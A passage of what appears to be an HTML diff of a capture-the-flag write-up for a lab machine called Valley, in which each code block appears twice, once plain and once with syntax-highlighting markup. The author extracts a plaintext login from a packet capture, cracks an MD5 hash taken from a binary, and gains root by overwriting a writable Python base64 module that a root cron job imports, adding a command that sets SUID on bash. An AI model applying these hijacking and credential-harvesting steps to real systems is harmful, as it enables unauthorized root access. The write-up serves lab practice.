+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">      </span><span class="mi">1978716</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">      </span><span class="mi">1972448</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="mi">226</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">OK</span><span class="p">.</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="nx">local</span><span class="p">:</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="nx">remote</span><span class="p">:</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="mi">229</span><span class="w"> </span><span class="nx">Entering</span><span class="w"> </span><span class="nx">Extended</span><span class="w"> </span><span class="nx">Passive</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">31509</span><span class="o">|</span><span class="p">)</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Opening</span><span class="w"> </span><span class="nx">BINARY</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="p">(</span><span class="mi">7272</span><span class="w"> </span><span class="nx">bytes</span><span class="p">).</span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|**************************************************************************************************************|</span><span class="w">  </span><span class="mi">7272</span><span class="w">       </span><span class="m m-Double">16.27</span><span class="w"> </span><span class="nx">MiB</span><span class="o">/</span><span class="nx">s</span><span class="w">    </span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="nx">ETA</span>
+<span class="mi">226</span><span class="w"> </span><span class="nx">Transfer</span><span class="w"> </span><span class="nx">complete</span><span class="p">.</span>
+<span class="mi">7272</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">received</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">3.20</span><span class="w"> </span><span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="nx">local</span><span class="p">:</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="nx">remote</span><span class="p">:</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="mi">229</span><span class="w"> </span><span class="nx">Entering</span><span class="w"> </span><span class="nx">Extended</span><span class="w"> </span><span class="nx">Passive</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">16349</span><span class="o">|</span><span class="p">)</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Opening</span><span class="w"> </span><span class="nx">BINARY</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="p">(</span><span class="mi">1978716</span><span class="w"> </span><span class="nx">bytes</span><span class="p">).</span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|**************************************************************************************************************|</span><span class="w">  </span><span class="mi">1932</span><span class="w"> </span><span class="nx">KiB</span><span class="w">   </span><span class="m m-Double">67.87</span><span class="w"> </span><span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="w">    </span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="nx">ETA</span>
+<span class="mi">226</span><span class="w"> </span><span class="nx">Transfer</span><span class="w"> </span><span class="nx">complete</span><span class="p">.</span>
+<span class="mi">1978716</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">received</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">67.00</span><span class="w"> </span><span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="nx">local</span><span class="p">:</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="nx">remote</span><span class="p">:</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="mi">229</span><span class="w"> </span><span class="nx">Entering</span><span class="w"> </span><span class="nx">Extended</span><span class="w"> </span><span class="nx">Passive</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">46872</span><span class="o">|</span><span class="p">)</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Opening</span><span class="w"> </span><span class="nx">BINARY</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span><span class="w"> </span><span class="p">(</span><span class="mi">1972448</span><span class="w"> </span><span class="nx">bytes</span><span class="p">).</span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|**************************************************************************************************************|</span><span class="w">  </span><span class="mi">1926</span><span class="w"> </span><span class="nx">KiB</span><span class="w">  </span><span class="m m-Double">108.25</span><span class="w"> </span><span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="w">    </span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="nx">ETA</span>
+<span class="mi">226</span><span class="w"> </span><span class="nx">Transfer</span><span class="w"> </span><span class="nx">complete</span><span class="p">.</span>
+<span class="mi">1972448</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">received</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">18</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">106.12</span><span class="w"> </span><span class="nx">KiB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span>
+</code></pre></div>
 
 <blockquote>
 <p>after analyzing siemHTTP2.pcapng find something filtering http</p>
 </blockquote>
-<pre class="codehilite"><code>Frame 2335: 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
-Linux cooked capture v1
-Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
-Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
-Hypertext Transfer Protocol
-HTML Form URL Encoded: application/x-www-form-urlencoded
-    Form item: &quot;uname&quot; = &quot;valleyDev&quot;
-    Form item: &quot;psw&quot; = &quot;ph0t0s1234&quot;
-        Key: psw
-        Value: ph0t0s1234
-    Form item: &quot;remember&quot; = &quot;on&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">Frame</span><span class="w"> </span><span class="mh">2335</span><span class="o">:</span><span class="w"> </span><span class="mh">605</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="kt">wire</span><span class="w"> </span><span class="p">(</span><span class="mh">4840</span><span class="w"> </span><span class="n">bits</span><span class="p">),</span><span class="w"> </span><span class="mh">605</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">captured</span><span class="w"> </span><span class="p">(</span><span class="mh">4840</span><span class="w"> </span><span class="n">bits</span><span class="p">)</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">interface</span><span class="w"> </span><span class="n">any</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="mh">0</span>
+<span class="n">Linux</span><span class="w"> </span><span class="n">cooked</span><span class="w"> </span><span class="n">capture</span><span class="w"> </span><span class="n">v1</span>
+<span class="n">Internet</span><span class="w"> </span><span class="n">Protocol</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mh">4</span><span class="p">,</span><span class="w"> </span><span class="nl">Src:</span><span class="w"> </span><span class="mf">192.168.111.136</span><span class="p">,</span><span class="w"> </span><span class="nl">Dst:</span><span class="w"> </span><span class="mf">192.168.111.136</span>
+<span class="n">Transmission</span><span class="w"> </span><span class="n">Control</span><span class="w"> </span><span class="n">Protocol</span><span class="p">,</span><span class="w"> </span><span class="n">Src</span><span class="w"> </span><span class="nl">Port:</span><span class="w"> </span><span class="mh">47096</span><span class="p">,</span><span class="w"> </span><span class="n">Dst</span><span class="w"> </span><span class="nl">Port:</span><span class="w"> </span><span class="mh">80</span><span class="p">,</span><span class="w"> </span><span class="nl">Seq:</span><span class="w"> </span><span class="mh">1</span><span class="p">,</span><span class="w"> </span><span class="nl">Ack:</span><span class="w"> </span><span class="mh">1</span><span class="p">,</span><span class="w"> </span><span class="nl">Len:</span><span class="w"> </span><span class="mh">537</span>
+<span class="n">Hypertext</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="n">Protocol</span>
+<span class="n">HTML</span><span class="w"> </span><span class="n">Form</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="nl">Encoded:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="w">    </span><span class="n">Form</span><span class="w"> </span><span class="nl">item:</span><span class="w"> </span><span class="s">&quot;uname&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;valleyDev&quot;</span>
+<span class="w">    </span><span class="n">Form</span><span class="w"> </span><span class="nl">item:</span><span class="w"> </span><span class="s">&quot;psw&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;ph0t0s1234&quot;</span>
+<span class="w">        </span><span class="nl">Key:</span><span class="w"> </span><span class="n">psw</span>
+<span class="w">        </span><span class="nl">Value:</span><span class="w"> </span><span class="n">ph0t0s1234</span>
+<span class="w">    </span><span class="n">Form</span><span class="w"> </span><span class="nl">item:</span><span class="w"> </span><span class="s">&quot;remember&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;on&quot;</span>
+</code></pre></div>
 
 <blockquote>
 <p>So login wia ssh found user.txt.</p>
 </blockquote>
-<pre class="codehilite"><code>valleyDev@valley:~$ ls
-user.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">valleyDev</span><span class="nv">@valley</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
 
 <blockquote>
 <p>and found something different file in home dir <code>valleyAuthenticator</code></p>
 </blockquote>
-<pre class="codehilite"><code>valleyDev@valley:/home$ ls
-siemDev  valley  valleyAuthenticator  valleyDev
-valleyDev@valley:/home$ 
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">valleyDev</span><span class="nv">@valley</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">siemDev</span><span class="w">  </span><span class="n">valley</span><span class="w">  </span><span class="n">valleyAuthenticator</span><span class="w">  </span><span class="n">valleyDev</span>
+<span class="n">valleyDev</span><span class="nv">@valley</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span>
+</code></pre></div>
 
 <blockquote>
 <p>So i download to my machine wia using python server to invistigate after downloading I open it wia strings and find</p>
 </blockquote>
-<pre class="codehilite"><code>❯ strings valleyAuthenticator
+<div class="codehilite"><pre><span></span><code><span class="n">❯</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="n">valleyAuthenticator</span>
 
--^;x&amp;
-e6722920bab2326f8217e4
-bf6b1b58ac
-ddJ1cc76ee3
-beb60709056cfbOW
-elcome to Valley Inc. Authentica
-[k0rHh
- is your usernad
-
-
-I found two hash
-    `e6722920bab2326f8217e4bf6b1b58ac
-     ddJ1cc76ee3beb60709056cfbOW`
+<span class="o">-^</span><span class="p">;</span><span class="n">x</span><span class="o">&amp;</span>
+<span class="n">e6722920bab2326f8217e4</span>
+<span class="n">bf6b1b58ac</span>
+<span class="n">ddJ1cc76ee3</span>
+<span class="n">beb60709056cfbOW</span>
+<span class="n">elcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Valley</span><span class="w"> </span><span class="n">Inc</span><span class="p">.</span><span class="w"> </span><span class="n">Authentica</span>
+<span class="err">[</span><span class="n">k0rHh</span>
+<span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">usernad</span>
 
 
-After use those hash on cracker and found 
-
-`|   |   |   |
-|---|---|---|
-|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|
-|ddJ1cc76ee3beb60709056cfbOW|Unknown|Unrecognized hash format.|`
+<span class="n">I</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="k">hash</span>
+<span class="w">    </span><span class="n n-Quoted">`e6722920bab2326f8217e4bf6b1b58ac</span>
+<span class="n n-Quoted">     ddJ1cc76ee3beb60709056cfbOW`</span>
 
 
-use that `liberty123`pwd and login as valley wia ssh
-</code></pre>
+<span class="k">After</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">those</span><span class="w"> </span><span class="k">hash</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">cracker</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">found</span><span class="w"> </span>
+
+<span class="n n-Quoted">`|   |   |   |</span>
+<span class="n n-Quoted">|---|---|---|</span>
+<span class="n n-Quoted">|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|</span>
+<span class="n n-Quoted">|ddJ1cc76ee3beb60709056cfbOW|Unknown|Unrecognized hash format.|`</span>
+
+
+<span class="k">use</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n n-Quoted">`liberty123`</span><span class="n">pwd</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">valley</span><span class="w"> </span><span class="n">wia</span><span class="w"> </span><span class="n">ssh</span>
+</code></pre></div>
 
 <blockquote>
 <p>and invistigating find something</p>
 </blockquote>
-<pre class="codehilite"><code>valley@valley:/$ cat etc/crontab
+<div class="codehilite"><pre><span></span><code><span class="n">valley</span><span class="nv">@valley:</span><span class="sr">/$ cat etc/c</span><span class="n">rontab</span>
 
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+<span class="c1"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+<span class="c1"># command to install the new version when you edit this file</span>
+<span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c1"># that none of the other crontabs do.</span>
 
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+<span class="n">SHELL</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
+<span class="n">PATH</span><span class="o">=</span><span class="sr">/usr/</span><span class="nb">local</span><span class="sr">/sbin:/</span><span class="n">usr</span><span class="sr">/local/</span><span class="n">bin:</span><span class="sr">/sbin:/</span><span class="n">bin:</span><span class="sr">/usr/s</span><span class="n">bin:</span><span class="sr">/usr/</span><span class="n">bin</span>
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+<span class="c1"># Example of job definition:</span>
+<span class="c1"># .---------------- minute (0 - 59)</span>
+<span class="c1"># |  .------------- hour (0 - 23)</span>
+<span class="c1"># |  |  .---------- day of month (1 - 31)</span>
+<span class="c1"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="c1"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="c1"># |  |  |  |  |</span>
+<span class="c1"># *  *  *  *  * user-name command to be executed</span>
+<span class="mi">17</span><span class="w"> </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">cd</span><span class="w"> </span><span class="sr">/ &amp;&amp; run-parts --report /</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">hourly</span>
+<span class="mi">25</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">daily</span><span class="w"> </span><span class="p">)</span>
+<span class="mi">47</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">weekly</span><span class="w"> </span><span class="p">)</span>
+<span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">monthly</span><span class="w"> </span><span class="p">)</span>
+<span class="mi">1</span><span class="w">  </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">python3</span><span class="w"> </span><span class="sr">/photos/sc</span><span class="n">ript</span><span class="o">/</span><span class="n">photosEncrypt</span><span class="o">.</span><span class="n">py</span>
 
 
-`find / -type f -name 'base64.py' -ls 2&gt;/dev/null`
+<span class="sb">`find / -type f -name &#39;base64.py&#39; -ls 2&gt;/dev/null`</span>
 
-    valley@valley:/$ find / -type f -name 'base64.py' -ls 2&gt;/dev/null
-   263097     24 -rwxrwxr-x   1 root     valleyAdmin    20490 Oct  9 09:08 /usr/lib/python3.8/base64.py
-     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
-     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py
-</code></pre>
+<span class="w">    </span><span class="n">valley</span><span class="nv">@valley:</span><span class="sr">/$ find /</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s">&#39;base64.py&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="n">null</span>
+<span class="w">   </span><span class="mi">263097</span><span class="w">     </span><span class="mi">24</span><span class="w"> </span><span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">valleyAdmin</span><span class="w">    </span><span class="mi">20490</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">08</span><span class="w"> </span><span class="sr">/usr/</span><span class="n">lib</span><span class="sr">/python3.8/</span><span class="n">base64</span><span class="o">.</span><span class="n">py</span>
+<span class="w">     </span><span class="mi">3929</span><span class="w">     </span><span class="mi">20</span><span class="w"> </span><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">           </span><span class="mi">20382</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">14</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="sr">/snap/co</span><span class="n">re20</span><span class="sr">/1828/</span><span class="n">usr</span><span class="sr">/lib/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">base64</span><span class="o">.</span><span class="n">py</span>
+<span class="w">     </span><span class="mi">3906</span><span class="w">     </span><span class="mi">20</span><span class="w"> </span><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">           </span><span class="mi">20382</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="sr">/snap/co</span><span class="n">re20</span><span class="sr">/1611/</span><span class="n">usr</span><span class="sr">/lib/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">base64</span><span class="o">.</span><span class="n">py</span>
+</code></pre></div>
 
 <blockquote>
 <p>so know something here can writable so change so change like this</p>
 </blockquote>
-<pre class="codehilite"><code>echo &quot;import os;os.system('chmod u+s /bin/bash')&quot; &gt; /usr/lib/python3.8/base64.py
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;import os;os.system(&#39;chmod u+s /bin/bash&#39;)&quot;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">base64</span><span class="o">.</span><span class="n">py</span>
+</code></pre></div>
 
 <blockquote>
 <p>and it work</p>
 </blockquote>
-<pre class="codehilite"><code>valley@valley:/$ ls -la /bin/bash
--rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">valley</span><span class="nv">@valley</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1183448</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div>
 
 <blockquote>
 <p>so run like this</p>
 </blockquote>
-<pre class="codehilite"><code>valley@valley:/$ bash -p
-bash-5.0# cd /root
-bash-5.0# ls
-root.txt  snap
-bash-5.0# cat root.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">valley</span><span class="nv">@valley</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="n">snap</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
         </div>
     </article>
 
